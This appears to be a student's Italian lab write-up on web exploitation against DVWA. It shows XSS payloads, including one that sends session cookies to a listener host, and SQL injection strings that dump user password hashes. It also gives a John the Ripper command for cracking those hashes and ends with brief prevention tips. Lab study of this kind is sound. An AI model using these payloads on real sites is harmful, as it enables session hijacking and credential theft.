# **Web Exploitation** 
La web exploitation si concentra sull'identificazione, l'analisi e lo sfruttamento di vulnerabilità presenti in applicazioni e servizi web.
Oggi ne andremo a vedere due: Cross-site scripting (XSS) e Structured Query Language (SQL)

## **Indice** 📘​
1. [XSS](#xss)
2. [SQL](#sql)
3. [John The Ripper](#john-the-ripper)
4. [Prevenzioni](#prevenzioni)

## **XSS** 💻​
**Alert**
```js
<script>alert("Sei vulnerabile")</script>
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/xss/1.png)

**Location window**
```js
<script> window.location='http://192.168.56.101/dvwa/about.php'; </script>
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/xss/loc1.png)

**Session ID**
```js
<script> document.write('<img src="http://192.168.56.102:3333?cookie=' + document.cookie + '">');<script>
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/xss/sd1.png)

**XSS stored**
```js
<script> window.location='http://192.168.56.101/dvwa/about.php'; </script>
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/xss/stored1.png)

## **SQL** 💉
**Condizione True**
```bash
'OR 1=1 #
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/sql/tabella.png)

**Enumerazione colonne**
```bash
' UNION SELECT null, null –
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/sql/colonne.png)

**Password**
```bash
'UNION SELECT first_name, password FROM users #
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/sql/pass.png)

## **John The Ripper**🔪
**Cracking Password**
```bash
john --format=raw-md5 hash.txt
```
➡️ [Foto](https://github.com/OctavianIT/Octavian_Ceresau_WebApp/blob/main/Octavian_Ceresau_WebApp/Octavian_Ceresau_WV/webapp/sql/cracking.png)

## **Prevenzioni**
**XSS**🛡️
- Rimuovere caratteri pericolosi (es/ <>, “” etc…)
- Usare librerie apposite per la sanitizzazione
- Applicare una rigorosa whitelist di cosa è permesso fare e cosa no
- Utilizzare un'escape output

**SQL**🛡️
- Rimuovere caratteri speciali
- Query parametrizzate

